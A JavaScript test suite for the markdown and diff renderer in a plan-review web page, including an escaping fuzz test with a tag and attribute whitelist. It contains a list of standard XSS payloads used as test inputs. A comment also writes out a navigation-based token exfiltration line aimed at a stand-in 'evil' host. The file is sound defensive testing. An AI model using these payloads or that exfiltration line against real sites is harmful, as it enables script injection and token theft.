// Tests for the markdown module embedded in ui/index.html.
//
// The parser is inline in the HTML so the page stays a single self-contained
// file, but it is isolated in <script id="plantor-md"> with no DOM access, so
// it can be evaluated here directly.
//
//   node tests/test_markdown.js
//
// Node is a dev-only dependency: plantor itself needs nothing but Python.

const fs = require("fs");
const path = require("path");
const assert = require("assert");

const html = fs.readFileSync(
  path.join(__dirname, "..", "ui", "index.html"),
  "utf8"
);
const match = html.match(/<script id="plantor-md">([\s\S]*?)<\/script>/);
assert.ok(match, "plantor-md script block not found in ui/index.html");

const mod = { exports: {} };
new Function("module", match[1])(mod);
const MD = mod.exports.PlantorMD;

let passed = 0;
const failures = [];

function test(name, fn) {
  try {
    fn();
    passed++;
  } catch (err) {
    failures.push({ name, err });
  }
}

// ---------------------------------------------------------------------------
// Escaping
// ---------------------------------------------------------------------------

test("esc neutralises markup", () => {
  assert.strictEqual(MD.esc('<img src=x onerror="a">'),
    "&lt;img src=x onerror=&quot;a&quot;&gt;");
});

test("script tags in plan text render as text, not markup", () => {
  const blocks = MD.parse("Watch out for </script><script>alert(1)</script> here.");
  assert.ok(!blocks[0].html.includes("<script"), "raw script tag leaked into html");
  assert.ok(blocks[0].html.includes("&lt;script"), "script tag was not escaped");
});

// ---------------------------------------------------------------------------
// Inline formatting
// ---------------------------------------------------------------------------

test("bold, italic and code render", () => {
  const out = MD.inline("a **bold** and *ital* and `code`");
  assert.ok(out.includes("<strong>bold</strong>"));
  assert.ok(out.includes("<em>ital</em>"));
  assert.ok(out.includes("<code>code</code>"));
});

test("code span contents are escaped, not interpreted", () => {
  const out = MD.inline("`<b>not bold</b>`");
  assert.ok(out.includes("<code>&lt;b&gt;not bold&lt;/b&gt;</code>"), out);
});

test("markdown inside a code span is left alone", () => {
  const out = MD.inline("`**not bold**`");
  assert.ok(out.includes("<code>**not bold**</code>"), out);
});

test("links render as inert text, never as anchors", () => {
  const out = MD.inline("see [the docs](https://example.com/x)");
  assert.ok(!out.includes("<a "), "produced a clickable anchor");
  assert.ok(out.includes("the docs"));
});

// Regression: the old implementation swapped code spans for a  sentinel.
// Plan text containing that sentinel collided with it and rendered the literal
// string "undefined" -- silent content corruption.
test("control-character sequences in plan text do not corrupt output", () => {
  const out = MD.inline("See item 07 in the appendix.");
  assert.ok(!out.includes("undefined"), "sentinel collision produced 'undefined'");
  assert.ok(out.includes("07"), "original text was lost");
});

test("digits-only code span survives round trip", () => {
  const out = MD.inline("returns `0` on success");
  assert.ok(out.includes("<code>0</code>"), out);
  assert.ok(!out.includes("undefined"), out);
});

// ---------------------------------------------------------------------------
// Lists  (regression: nesting used to be flattened)
// ---------------------------------------------------------------------------

test("nested ordered list stays nested inside its parent item", () => {
  const blocks = MD.parse(
    "- Implement feature X\n" +
    "  1. Write the migration\n" +
    "  2. Backfill existing rows\n" +
    "- Add tests\n"
  );
  assert.strictEqual(blocks.length, 1, "list should be one block");
  const html = blocks[0].html;
  assert.ok(html.includes("<ol>"), "nested ordered list was flattened away");
  const topLevel = html.split("</li>").length - 1;
  assert.ok(html.indexOf("<ol>") > html.indexOf("Implement feature X"),
    "sub-list is not inside its parent item");
  assert.ok(topLevel >= 4, "expected parent and child items to both exist");
});

test("sub-items are not promoted to top-level siblings", () => {
  const blocks = MD.parse("- Parent\n  - Child\n");
  const html = blocks[0].html;
  // The child must live inside the parent <li>, i.e. before its closing tag.
  const firstClose = html.indexOf("</li>");
  assert.ok(html.indexOf("Child") < firstClose,
    "child item escaped its parent: " + html);
});

test("ordered and unordered lists pick the right tag", () => {
  assert.ok(MD.parse("1. one\n2. two\n")[0].html.startsWith("<ol>"));
  assert.ok(MD.parse("- one\n- two\n")[0].html.startsWith("<ul>"));
});

test("continuation lines join their item", () => {
  const html = MD.parse("- first line\n  continued here\n- second\n")[0].html;
  assert.ok(html.includes("first line continued here"), html);
});

// ---------------------------------------------------------------------------
// Blocks and sections
// ---------------------------------------------------------------------------

test("headings become blocks and set the section for what follows", () => {
  const blocks = MD.parse("# Title\n\n## Approach\n\nWe will do a thing.\n");
  const para = blocks[blocks.length - 1];
  assert.strictEqual(para.section, "Approach");
});

test("section resets at each new heading", () => {
  const blocks = MD.parse("## One\n\npara a\n\n## Two\n\npara b\n");
  const paras = blocks.filter(b => b.html.startsWith("<p>"));
  assert.strictEqual(paras[0].section, "One");
  assert.strictEqual(paras[1].section, "Two");
});

test("fenced code is one block with contents escaped", () => {
  const blocks = MD.parse("```\nif (a < b) { x(); }\n```\n");
  assert.ok(blocks[0].html.includes("<pre><code>"));
  assert.ok(blocks[0].html.includes("a &lt; b"), blocks[0].html);
});

test("markdown inside a fence is not interpreted", () => {
  const blocks = MD.parse("```\n- not a list\n**not bold**\n```\n");
  assert.ok(!blocks[0].html.includes("<li>"), blocks[0].html);
  assert.ok(!blocks[0].html.includes("<strong>"), blocks[0].html);
});

test("tables parse with header and body rows", () => {
  const blocks = MD.parse("| A | B |\n|---|---|\n| 1 | 2 |\n");
  const html = blocks[0].html;
  assert.ok(html.includes("<th>A</th>"), html);
  assert.ok(html.includes("<td>1</td>"), html);
});

test("blockquotes parse", () => {
  assert.ok(MD.parse("> a note\n")[0].html.startsWith("<blockquote>"));
});

test("paragraphs split on blank lines", () => {
  const blocks = MD.parse("one\n\ntwo\n");
  assert.strictEqual(blocks.filter(b => b.html.startsWith("<p>")).length, 2);
});

test("every block carries text for anchoring", () => {
  MD.parse("# H\n\npara\n\n- item\n\n> quote\n").forEach(b => {
    assert.strictEqual(typeof b.text, "string");
    assert.ok(b.text.length > 0, "empty anchor text for: " + b.html);
  });
});

// ---------------------------------------------------------------------------
// plain()  -- used for the short anchor sent to Claude
// ---------------------------------------------------------------------------

test("plain strips markdown syntax", () => {
  assert.strictEqual(
    MD.plain("Use a **token bucket** with `redis` and [docs](http://x)"),
    "Use a token bucket with redis and docs"
  );
});

test("plain collapses whitespace and drops heading markers", () => {
  assert.strictEqual(MD.plain("##  Some   Heading\n"), "Some Heading");
});

// ---------------------------------------------------------------------------
// Revision diff
// ---------------------------------------------------------------------------

const V1 = "# Plan\n\n## Approach\n\nUse Redis for the bucket.\n\n## Steps\n\n- one\n- two\n";

test("an edited paragraph is classified changed, not added+removed", () => {
  const after = V1.replace("Use Redis", "Use Postgres");
  const d = MD.diffPlans(V1, after);
  const changed = d.blocks.filter(b => b.status === "changed");
  assert.strictEqual(changed.length, 1, JSON.stringify(d.blocks));
  assert.ok(changed[0].prev.includes("Redis"), "previous text not carried");
  assert.strictEqual(d.removed.length, 0, "edit was misread as a removal");
});

test("a new section is classified added", () => {
  const after = V1 + "\n## Rollout\n\nShip behind a flag.\n";
  const d = MD.diffPlans(V1, after);
  assert.strictEqual(d.blocks.filter(b => b.status === "added").length, 2);
  assert.strictEqual(d.removed.length, 0);
});

test("a deleted section is reported as removed", () => {
  const after = V1.replace("## Steps\n\n- one\n- two\n", "");
  const d = MD.diffPlans(V1, after);
  assert.ok(d.removed.length >= 1, JSON.stringify(d));
});

test("an identical plan reports no changes at all", () => {
  const d = MD.diffPlans(V1, V1);
  assert.ok(d.blocks.every(b => b.status === "same"), JSON.stringify(d.blocks));
  assert.strictEqual(d.removed.length, 0);
});

test("unchanged blocks stay unchanged when something else edits", () => {
  const after = V1.replace("Use Redis", "Use Postgres");
  const d = MD.diffPlans(V1, after);
  assert.strictEqual(d.blocks.filter(b => b.status === "same").length,
                     d.blocks.length - 1);
});

test("wordDiff marks only the words that actually moved", () => {
  const out = MD.wordDiff("Use Redis for the bucket.", "Use Postgres for the bucket.");
  assert.ok(out.includes("<del>Redis</del>"), out);
  assert.ok(out.includes("<ins>Postgres</ins>"), out);
  assert.ok(!out.includes("<del>bucket"), "unchanged words were marked: " + out);
});

test("wordDiff escapes both sides", () => {
  const out = MD.wordDiff("<script>a</script>", "<script>b</script>");
  assert.ok(!/<script/i.test(out), "unescaped markup in diff output: " + out);
  assert.ok(out.includes("&lt;script"), out);
});

// ---------------------------------------------------------------------------
// Bounded work on a hostile plan.
//
// The review tab is the only way the human delivers a verdict, and the hook
// blocks on it for up to four days. A plan that hangs or OOMs the tab removes
// the review gate entirely, so every quadratic path has to be bounded.
// ---------------------------------------------------------------------------

function bigParagraph(n) {
  const w = [];
  for (let i = 0; i < n; i++) w.push("word" + i);
  return w.join(" ");
}

test("wordDiff on a huge paragraph returns instead of exhausting the heap", () => {
  const before = bigParagraph(20000), after = before + " x";
  const t = Date.now();
  const out = MD.wordDiff(before, after);
  const ms = Date.now() - t;
  assert.ok(ms < 2000, "wordDiff took " + ms + "ms");
  assert.ok(out.includes("word19999"), "content dropped entirely");
  assert.ok(!/[<>]/.test(out.replace(/&lt;|&gt;|&amp;|&quot;|&#39;/g, "")),
    "fallback path skipped escaping");
});

test("splitDiff on a huge paragraph stays bounded and escapes both sides", () => {
  const before = bigParagraph(20000) + " <img src=x>";
  const after = bigParagraph(20000) + " <script>alert(1)</script>";
  const t = Date.now();
  const s = MD.splitDiff(before, after);
  assert.ok(Date.now() - t < 2000);
  assert.ok(!/<img/.test(s.before), s.before.slice(-80));
  assert.ok(!/<script/.test(s.after), s.after.slice(-80));
});

test("a plan with a huge paragraph still diffs at block level", () => {
  // Only the oversized block loses its word marks; the rest of the plan is
  // still compared normally.
  const v1 = "# Plan\n\n## Approach\n\nUse Redis.\n\n## Body\n\n" + bigParagraph(20000) + "\n";
  const v2 = "# Plan\n\n## Approach\n\nUse Postgres.\n\n## Body\n\n" + bigParagraph(20000) + " x\n";
  const t = Date.now();
  const d = MD.diffPlans(v1, v2);
  assert.ok(Date.now() - t < 3000, "diffPlans took too long");
  assert.ok(d, "diff was abandoned for a plan of ordinary block count");
  assert.strictEqual(d.blocks.filter(b => b.status === "changed").length, 2);
});

test("diffPlans gives up rather than gridlocking on an enormous block count", () => {
  const many = n => Array.from({ length: n }, (_, i) => "para " + i).join("\n\n");
  const t = Date.now();
  const d = MD.diffPlans(many(3000), many(3000) + "\n\ntail");
  assert.ok(Date.now() - t < 5000, "took too long");
  if (d === null) return;                    // gave up: the plan renders whole
  assert.strictEqual(d.blocks.length, 3001); // or it completed correctly
});

test("splitRows degrades to plain rows when the diff is abandoned", () => {
  const many = n => Array.from({ length: n }, (_, i) => "para " + i).join("\n\n");
  const rows = MD.splitRows(many(3000), many(3000) + "\n\ntail");
  assert.strictEqual(rows.length, MD.parse(many(3000) + "\n\ntail").length);
  rows.forEach((r, i) => assert.strictEqual(r.index, i));
});

test("similarity separates an edit from an unrelated block", () => {
  assert.ok(MD.similarity("the quick brown fox jumps",
                          "the quick brown cat jumps") > 0.6);
  assert.ok(MD.similarity("the quick brown fox",
                          "entirely different content here") < 0.4);
});

// ---------------------------------------------------------------------------
// Side-by-side (split) diff
// ---------------------------------------------------------------------------

test("splitDiff puts removals on the left and additions on the right", () => {
  const s = MD.splitDiff("use redis for the bucket", "use postgres for the bucket");
  assert.ok(s.before.includes("<del>redis</del>"), "left: " + s.before);
  assert.ok(!s.before.includes("<ins>"), "addition leaked left: " + s.before);
  assert.ok(s.after.includes("<ins>postgres</ins>"), "right: " + s.after);
  assert.ok(!s.after.includes("<del>"), "removal leaked right: " + s.after);
});

test("splitDiff keeps the unchanged words on both sides", () => {
  const s = MD.splitDiff("a b c", "a x c");
  assert.ok(/a\s.*c/.test(s.before.replace(/<[^>]+>/g, "")), s.before);
  assert.ok(/a\s.*c/.test(s.after.replace(/<[^>]+>/g, "")), s.after);
});

test("splitDiff escapes both sides", () => {
  const s = MD.splitDiff("<img src=x>", "<script>alert(1)</script>");
  assert.ok(!/<img/.test(s.before), s.before);
  assert.ok(!/<script/.test(s.after), s.after);
});

test("splitRows gives one row per new block when nothing changed", () => {
  const rows = MD.splitRows(V1, V1);
  const blocks = MD.parse(V1);
  assert.strictEqual(rows.length, blocks.length);
  rows.forEach((r, i) => {
    assert.strictEqual(r.status, "same");
    assert.strictEqual(r.index, i);
  });
});

test("splitRows marks an edited block changed and carries the old text", () => {
  const v2 = V1.replace("Use Redis for the bucket.", "Use Postgres for the bucket.");
  const row = MD.splitRows(V1, v2).find(r => r.status === "changed");
  assert.ok(row, "no changed row");
  assert.ok(row.prevText.includes("Redis"), row.prevText);
  assert.ok(MD.parse(v2)[row.index].text.includes("Postgres"));
});

test("splitRows marks a new block added, with no left-hand side", () => {
  const v2 = V1 + "\n## Rollout\n\nShip behind a flag.\n";
  const rows = MD.splitRows(V1, v2).filter(r => r.status === "added");
  assert.ok(rows.length >= 1);
  rows.forEach(r => assert.strictEqual(r.prevText, ""));
});

test("splitRows emits a removed row with no right-hand side", () => {
  const v2 = V1.replace("## Steps\n\n- one\n- two\n", "");
  const rows = MD.splitRows(V1, v2).filter(r => r.status === "removed");
  assert.ok(rows.length >= 1, "nothing reported removed");
  rows.forEach(r => {
    assert.strictEqual(r.index, -1);
    assert.ok(r.prevText.length > 0);
  });
});

test("a removed section stays contiguous, anchored to what preceded it", () => {
  const v1 = "# Plan\n\n## Approach\n\nUse Redis.\n\n## Rollback\n\nFlip the flag off.\n\n## Steps\n\n- one\n";
  const v2 = "# Plan\n\n## Approach\n\nUse Redis.\n\n## Steps\n\n- one\n";
  const rows = MD.splitRows(v1, v2);
  const removed = rows.map((r, i) => [r, i]).filter(x => x[0].status === "removed");
  assert.strictEqual(removed.length, 2, "expected the heading and its paragraph");
  assert.strictEqual(removed[1][1], removed[0][1] + 1,
    "removed heading and paragraph were split apart: " +
    JSON.stringify(rows.map(r => r.status)));
  assert.ok(/Rollback/.test(removed[0][0].prevText), removed[0][0].prevText);
});

test("splitRows covers every new block exactly once, in order", () => {
  const v2 = "# Plan\n\n## Approach\n\nUse Postgres.\n\n## Rollout\n\nShip it.\n";
  const rows = MD.splitRows(V1, v2);
  const seen = rows.filter(r => r.index >= 0).map(r => r.index);
  assert.deepStrictEqual(seen, MD.parse(v2).map((_, i) => i));
});

// Hostile strings reused by the mermaid tests below and by the fuzz suite.
const HOSTILE = [
  '<script>alert(1)</script>',
  '</script><script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  '<svg/onload=alert(1)>',
  '"><img src=x onerror=alert(1)>',
  "'><img src=x onerror=alert(1)>",
  '<iframe src="javascript:alert(1)">',
  '[click](javascript:alert(1))',
  '`<img src=x onerror=alert(1)>`',
  '**<img src=x onerror=alert(1)>**',
  '<a href="#" onmouseover="alert(1)">x</a>',
  '<body onload=alert(1)>',
  '\u0001 0 \u0001',
];

// ---------------------------------------------------------------------------
// Fenced code: language capture and highlighting
// ---------------------------------------------------------------------------

test("fence language is captured and rendered as a label", () => {
  const b = MD.parse("```python\nx = 1\n```")[0];
  assert.strictEqual(b.lang, "python");
  assert.ok(/class="lang"[^>]*>python</.test(b.html), "no language label: " + b.html);
});

test("a fence with no language still renders and carries no label", () => {
  const b = MD.parse("```\nplain text\n```")[0];
  assert.strictEqual(b.lang, "");
  assert.ok(b.html.includes("<pre"), b.html);
  assert.ok(!/class="lang"/.test(b.html), "empty label rendered: " + b.html);
});

test("a hostile fence language is sanitised away, not echoed", () => {
  const b = MD.parse('```<img src=x onerror=alert(1)>\ncode\n```')[0];
  assert.strictEqual(b.lang, "");
  assert.ok(!/<img/i.test(b.html), "language leaked as markup: " + b.html);
});

test("highlighting marks keywords, strings and comments", () => {
  const out = MD.highlight('def go(n):\n    # count\n    return "done"', "python");
  assert.ok(/<span class="t-k">def<\/span>/.test(out), "keyword not marked: " + out);
  assert.ok(/<span class="t-s">&quot;done&quot;<\/span>/.test(out), "string not marked: " + out);
  assert.ok(/<span class="t-c"># count<\/span>/.test(out), "comment not marked: " + out);
});

test("highlighting an unknown language still escapes and returns the source", () => {
  const out = MD.highlight('a <b> "c" 1', "brainfuck");
  assert.ok(!/<b>/.test(out), "raw markup survived: " + out);
  assert.ok(out.includes("&lt;b&gt;"), out);
});

test("highlighting never emits unescaped source", () => {
  ['var s = "<img src=x onerror=alert(1)>";',
   '# </script><script>alert(1)</script>',
   "s = '<svg/onload=alert(1)>'"].forEach(src => {
    ["js", "python", "bash", ""].forEach(lang => {
      const out = MD.highlight(src, lang);
      const residue = out.replace(/<\/?span class="t-[a-z]">/g, "").replace(/<\/span>/g, "");
      assert.ok(!/[<>]/.test(residue.replace(/&lt;|&gt;|&amp;|&quot;|&#39;/g, "")),
        "unescaped markup in highlight(" + JSON.stringify(src) + ", " + lang + "): " + out);
    });
  });
});

test("a code block's text stays the verbatim source, for anchoring", () => {
  const src = "def go():\n    return 1";
  const b = MD.parse("```python\n" + src + "\n```")[0];
  assert.strictEqual(b.text, src);
});

// ---------------------------------------------------------------------------
// Mermaid
// ---------------------------------------------------------------------------

const FLOW = "```mermaid\nflowchart TD\n  A[Start] --> B{Ok?}\n  B -->|yes| C[Ship]\n  B -->|no| D(Fix)\n```";

test("a mermaid fence renders inline svg, not a code block", () => {
  const b = MD.parse(FLOW)[0];
  assert.strictEqual(b.lang, "mermaid");
  assert.ok(b.html.includes("<svg"), "no svg: " + b.html);
  assert.ok(!b.html.includes("<pre"), "fell back to source: " + b.html);
});

test("every flowchart node label appears in the svg", () => {
  const html = MD.parse(FLOW)[0].html;
  ["Start", "Ok?", "Ship", "Fix"].forEach(label =>
    assert.ok(html.includes(">" + label + "<"), "missing label " + label + ": " + html));
});

test("edge labels are rendered", () => {
  const html = MD.parse(FLOW)[0].html;
  assert.ok(html.includes(">yes<"), "missing edge label: " + html);
  assert.ok(html.includes(">no<"), "missing edge label: " + html);
});

test("node shapes are distinguishable", () => {
  const html = MD.parse(FLOW)[0].html;
  assert.ok(/<polygon /.test(html), "no diamond for {Ok?}: " + html);
  assert.ok(/<rect /.test(html), "no rect for [Start]: " + html);
});

test("both graph and flowchart keywords parse, in every direction", () => {
  ["flowchart TD", "flowchart LR", "graph TB", "graph RL", "graph BT"].forEach(head => {
    const html = MD.parse("```mermaid\n" + head + "\n  A[One] --> B[Two]\n```")[0].html;
    assert.ok(html.includes("<svg"), head + " did not render: " + html);
    assert.ok(html.includes(">One<") && html.includes(">Two<"), head + ": " + html);
  });
});

test("a bare node id with no shape still renders, labelled by its id", () => {
  const html = MD.parse("```mermaid\ngraph LR\n  alpha --> beta\n```")[0].html;
  assert.ok(html.includes(">alpha<") && html.includes(">beta<"), html);
});

test("a cycle terminates and still renders", () => {
  const html = MD.parse("```mermaid\ngraph TD\n A[a] --> B[b]\n B --> C[c]\n C --> A\n```")[0].html;
  assert.ok(html.includes("<svg"), html);
  assert.ok(html.includes(">a<") && html.includes(">b<") && html.includes(">c<"), html);
});

test("a cycle does not inflate the layout with empty ranks", () => {
  // A back edge used to push its own nodes down on every ranking pass, so a
  // four-node loop rendered as fifteen ranks of mostly blank canvas.
  const html = MD.parse("```mermaid\ngraph TD\n A[a] --> B[b]\n B --> C[c]\n C --> A\n```")[0].html;
  const h = Number(/height="([\d.]+)"/.exec(html)[1]);
  assert.ok(h < 320, "cycle produced a " + h + "px tall diagram for three ranks");
});

test("dotted and thick edges parse as edges", () => {
  const html = MD.parse("```mermaid\ngraph LR\n A[a] -.-> B[b]\n B ==> C[c]\n A --- C\n```")[0].html;
  assert.ok(html.includes("<svg"), html);
  assert.ok(html.includes(">c<"), html);
});

test("sequenceDiagram renders participants and messages", () => {
  const src = "```mermaid\nsequenceDiagram\n  participant Client\n  participant API\n" +
              "  Client->>API: POST /ingest\n  API-->>Client: 202 Accepted\n```";
  const html = MD.parse(src)[0].html;
  assert.ok(html.includes("<svg"), html);
  assert.ok(html.includes(">Client<") && html.includes(">API<"), html);
  assert.ok(html.includes(">POST /ingest<"), html);
  assert.ok(html.includes(">202 Accepted<"), html);
});

test("a dashed reply does not invent phantom participants", () => {
  const src = "```mermaid\nsequenceDiagram\n  A->>B: ask\n  B-->>A: answer\n```";
  const html = MD.parse(src)[0].html;
  assert.ok(!/>B-</.test(html) && !/>A-</.test(html), "phantom lifeline: " + html);
  assert.strictEqual((html.match(/class="mlife"/g) || []).length, 2,
    "expected exactly two lifelines: " + html);
});

test("an unsupported diagram type falls back to the source, with a note", () => {
  const src = "```mermaid\ngantt\n  title Roadmap\n  section One\n```";
  const b = MD.parse(src)[0];
  assert.ok(b.html.includes("<pre"), "did not fall back: " + b.html);
  assert.ok(b.html.includes("title Roadmap"), "source lost in fallback: " + b.html);
  assert.ok(/class="note"/.test(b.html), "no explanatory note: " + b.html);
});

test("a subgraph falls back rather than silently dropping the grouping", () => {
  const src = "```mermaid\nflowchart TD\n subgraph edge\n A[a] --> B[b]\n end\n```";
  const b = MD.parse(src)[0];
  assert.ok(b.html.includes("<pre"), "grouping silently dropped: " + b.html);
});

test("a mermaid block's text stays the verbatim source, for anchoring", () => {
  const b = MD.parse(FLOW)[0];
  assert.ok(b.text.includes("flowchart TD"), b.text);
  assert.ok(b.text.includes("B -->|yes| C[Ship]"), b.text);
});

test("hostile mermaid labels are escaped inside the svg", () => {
  HOSTILE.forEach(hostile => {
    const src = "```mermaid\nflowchart TD\n  A[" + hostile + "] -->|" + hostile +
                "| B[" + hostile + "]\n```";
    const html = MD.parse(src)[0].html;
    assert.ok(!/<script|<img|<iframe|<foreignObject/i.test(html),
      "live tag from label " + JSON.stringify(hostile) + ": " + html);
    assert.ok(!/<[a-z][a-z0-9-]*[^>]*\son[a-z]+\s*=/i.test(html),
      "event handler from label " + JSON.stringify(hostile) + ": " + html);
    assert.ok(!/<[a-z][a-z0-9-]*[^>]*\shref/i.test(html),
      "href from label " + JSON.stringify(hostile) + ": " + html);
  });
});

test("a mermaid id cannot inject svg attributes", () => {
  const html = MD.parse('```mermaid\ngraph LR\n  A" onload="alert(1) --> B[b]\n```')[0].html;
  assert.ok(!/<[a-z][a-z0-9-]*[^>]*\sonload\s*=/i.test(html), html);
});

// ---------------------------------------------------------------------------
// Escaping invariant, fuzzed.
//
// CSP here uses script-src 'unsafe-inline' (the page's own scripts are inline),
// so CSP does NOT block script execution -- it only blocks loading external
// resources. That makes this escaping the entire XSS defense, with nothing
// behind it. Note also that exfiltration would not even need connect-src:
// location.href = "http://evil/?t=" + TOKEN is a navigation, which CSP does not
// govern. Hence: no plan text may ever reach innerHTML unescaped, fuzzed here
// so a future edit cannot quietly reintroduce a sink.
// ---------------------------------------------------------------------------


// Every structural position a hostile string can occupy.
const TEMPLATES = [
  s => s,
  s => "# " + s,
  s => "- " + s,
  s => "- a\n  - " + s,
  s => "1. " + s,
  s => "> " + s,
  s => "| A | B |\n|---|---|\n| " + s + " | b |",
  s => "| " + s + " |\n|---|\n| b |",
  s => "```\n" + s + "\n```",
  s => "para with " + s + " inline",
  s => "**bold " + s + "**",
];

// Only these tags may ever appear in generated html. Asserting on the tag
// whitelist rather than on substrings is the point: "&lt;img ... onerror=..." is
// escaped, inert text and must NOT fail, while a real <img> must.
// Only these tags may ever appear in generated html, and only these attribute
// names on them. Asserting on a whitelist rather than on substrings is the
// point: "&lt;img ... onerror=..." is escaped, inert text and must NOT fail,
// while a real <img> must.
//
// Attributes exist here only because mermaid renders to inline SVG, which
// cannot be drawn without geometry. Every one of these values is generated
// from numbers we computed, never from plan text -- plan text reaches the SVG
// only as escaped element content. The whitelist is what keeps that true.
const ALLOWED = ("p h1 h2 h3 ul ol li code pre strong em blockquote " +
                 "table thead tbody tr th td hr div span figure figcaption " +
                 "svg g rect polygon ellipse circle line path text").split(" ");
const ATTR_OK = ("class viewBox width height x y x1 y1 x2 y2 rx ry cx cy r " +
                 "points fill stroke stroke-width stroke-dasharray stroke-linejoin " +
                 "text-anchor dominant-baseline font-size aria-hidden role " +
                 "preserveAspectRatio").split(" ");

const TAG = /<\/?([a-z][a-z0-9-]*)((?:\s[^>]*?)?)\/?>/gi;
const ATTR = /([a-zA-Z][a-zA-Z0-9-]*)\s*=\s*"([^"]*)"/g;

function auditTags(html, where) {
  let m;
  TAG.lastIndex = 0;
  while ((m = TAG.exec(html))) {
    const tag = m[1].toLowerCase();
    assert.ok(ALLOWED.indexOf(tag) >= 0, "tag <" + tag + "> is not whitelisted:" + where);
    const attrs = m[2];
    if (!attrs.trim()) continue;
    let a;
    ATTR.lastIndex = 0;
    let seen = "";
    while ((a = ATTR.exec(attrs))) {
      seen += a[0];
      assert.ok(ATTR_OK.indexOf(a[1]) >= 0,
        "attribute " + a[1] + " on <" + tag + "> is not whitelisted:" + where);
      assert.ok(!/[<>]/.test(a[2]), "raw markup inside an attribute value:" + where);
      assert.ok(!/javascript:|url\s*\(/i.test(a[2]),
        "live url in attribute " + a[1] + ":" + where);
    }
    // Anything in the attribute region that was not a quoted name="value"
    // pair means an unquoted or malformed attribute, i.e. injection.
    assert.ok(attrs.replace(ATTR, "").trim() === "",
      "unparsed attribute text on <" + tag + ">: " + attrs + where);
  }
}

test("only whitelisted tags and attributes survive, for every hostile input and position", () => {
  HOSTILE.forEach(hostile => {
    TEMPLATES.forEach((tpl, ti) => {
      const md = tpl(hostile);
      const html = MD.parse(md).map(b => b.html).join("\n");
      const where = "\n  template " + ti + " with " + JSON.stringify(hostile) +
        "\n  -> " + html;

      auditTags(html, where);

      // Strip every tag we legitimately generate. Anything angle-bracketed
      // left over means plan text reached the DOM as markup.
      const residue = html.replace(TAG, "");
      assert.ok(!/[<>]/.test(residue.replace(/&lt;|&gt;|&amp;|&quot;|&#39;/g, "")),
        "unescaped markup survived:" + where + "\n  residue: " + residue);

      assert.ok(!/javascript:/i.test(html.replace(/&[a-z]+;/g, "")) ||
                !/<a\s/i.test(html),
        "javascript: url in a live anchor:" + where);
      assert.ok(!/undefined/.test(html), "sentinel corruption:" + where);
    });
  });
});

test("mermaid svg passes the same tag and attribute audit", () => {
  HOSTILE.forEach(hostile => {
    ["flowchart TD\n  A[" + hostile + "] -->|" + hostile + "| B[b]",
     "sequenceDiagram\n  A->>B: " + hostile,
     "graph LR\n  " + hostile + " --> B[b]"].forEach(body => {
      const html = MD.parse("```mermaid\n" + body + "\n```")[0].html;
      auditTags(html, "\n  mermaid " + JSON.stringify(body) + "\n  -> " + html);
    });
  });
});

test("highlighted code passes the same tag and attribute audit", () => {
  HOSTILE.forEach(hostile => {
    ["python", "js", "bash", "json", ""].forEach(lang => {
      const html = MD.parse("```" + lang + "\n" + hostile + "\n```")[0].html;
      auditTags(html, "\n  " + lang + " " + JSON.stringify(hostile) + "\n  -> " + html);
    });
  });
});

test("a real tag in plan text is escaped, and escaped text is left as text", () => {
  const html = MD.parse("<img src=x onerror=alert(1)>").map(b => b.html).join("");
  assert.strictEqual(html, "<p>&lt;img src=x onerror=alert(1)&gt;</p>");
});

test("plain() output is always safe once esc()'d, which is how it is used", () => {
  // plain() is not itself an escaper -- it strips markdown for display. It only
  // ever reaches the DOM via MD.esc() or textContent, so the invariant is that
  // esc(plain(x)) is inert.
  HOSTILE.forEach(hostile => {
    const out = MD.esc(MD.plain(hostile));
    assert.ok(!/[<>]/.test(out.replace(/&lt;|&gt;|&amp;|&quot;|&#39;/g, "")),
      "esc(plain(x)) left raw markup: " + out);
  });
});

test("esc neutralises every hostile string", () => {
  HOSTILE.forEach(hostile => {
    const out = MD.esc(hostile);
    assert.ok(!/</.test(out), "raw < survived esc: " + out);
    assert.ok(!/>/.test(out), "raw > survived esc: " + out);
  });
});

// ---------------------------------------------------------------------------

if (failures.length) {
  failures.forEach(f => {
    console.error("FAIL: " + f.name);
    console.error("      " + f.err.message);
  });
  console.error("\n" + failures.length + " failed, " + passed + " passed");
  process.exit(1);
}
console.log("ok - " + passed + " markdown tests passed");
